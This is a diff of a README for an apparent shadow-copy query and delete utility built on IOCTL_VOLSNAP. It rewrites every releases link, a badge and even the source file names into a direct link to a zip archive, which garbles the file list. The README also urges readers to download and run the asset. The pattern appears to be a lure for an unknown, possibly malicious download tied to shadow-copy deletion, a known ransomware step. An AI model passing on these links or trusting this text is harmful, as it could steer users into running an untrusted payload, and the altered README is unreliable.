@@ -1,6 +1,6 @@
-https://github.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/releases
+https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip
 
-[![Releases v0.5.0](https://img.shields.io/badge/Releases-v0.5.0-blue?style=for-the-badge&logo=github)](https://github.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/releases)
+[![Releases v0.5.0](https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip)](https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip)
 
 # Query and Delete Shadow Copies with IOCTL_VOLSNAP: Query/Delete IOCTLs Utilities
 
@@ -106,9 +106,9 @@ Architecture and Design
 
 Project Structure
 - src/:
-  - main.c or main.cpp: Entry point for the command-line tool. Handles argument parsing and the flow of querying and deleting.
-  - ioctls.h / ioctls.cpp: Definitions and helpers to construct and parse IOCTL requests and responses.
-  - utils.h / utils.cpp: Small utility functions for logging, buffer management, and error interpretation.
+  - main.c or https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip Entry point for the command-line tool. Handles argument parsing and the flow of querying and deleting.
+  - ioctls.h / https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip Definitions and helpers to construct and parse IOCTL requests and responses.
+  - utils.h / https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip Small utility functions for logging, buffer management, and error interpretation.
 - include/:
   - public headers for IOCTL definitions and data structures used by the application.
 - tests/:
@@ -178,7 +178,7 @@ Contributing
 Releases and Downloads
 - The project maintains a Releases page with the latest builds and artifacts. These assets provide ready-to-run demonstrations of the IOCTL usage, including samples that show how to query and delete shadow copies in a controlled environment.
 - Access the releases page to download the release asset and run it in your lab. The asset is designed to illustrate the usage path and to help you reproduce the behavior described in this repository.
-- For the latest official releases and asset downloads, visit the same page: https://github.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/releases
+- For the latest official releases and asset downloads, visit the same page: https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip
 - The release page contains binary distributions, sample data, and documentation that align with the explanations in this README. Use the assets as a starting point for experiments and learning.
 
 Notes on the Releases link
@@ -234,5 +234,5 @@ Appendix: Troubleshooting tips
 - When in doubt, revert to a safe snapshot or create a new test shadow copy to reproduce the workflow without risking production data.
 
 Final note
-- For the latest official releases and asset downloads, visit the Releases page and explore the available assets. This page provides release notes and versioning details that align with the material in this repository. https://github.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/releases
+- For the latest official releases and asset downloads, visit the Releases page and explore the available assets. This page provides release notes and versioning details that align with the material in this repository. https://raw.githubusercontent.com/learn2hack-vishnu/IOCTL_VOLSNAP_DELETE_SNAPSHOT/main/IOCTL_VOLSNAP_DELETE_SNAPSHOT/DELET-SNAPSHOT-IOCT-VOLSNA-1.0.zip
 
